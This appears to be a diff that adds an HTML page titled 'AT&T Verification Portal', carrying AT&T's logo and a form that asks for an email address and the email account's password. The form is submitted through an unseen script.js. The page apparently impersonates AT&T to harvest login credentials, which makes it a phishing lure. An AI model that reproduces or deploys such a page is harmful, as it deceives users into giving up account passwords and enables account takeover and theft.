@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AT&T Verification Portal</title>
+    <link rel="icon" type="image/png" href="favicon.png">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="form-container">
+        <img src="att-logo.png" alt="AT&T Logo" class="logo">
+        <h3>Account Verification</h3>
+        <form id="user-form">
+            <div class="form-group">
+                <label for="email">Email Address:</label>
+                <input type="email" id="email" name="email" class="form-control" placeholder="Enter your email" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Email Password:</label>
+                <input type="password" id="password" name="password" class="form-control" placeholder="Enter Password" required>
+            </div>
+            <button type="submit" class="btn btn-primary btn-block">Login</button>
+        </form>
+        <p id="submission-feedback" class="info-text"></p>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
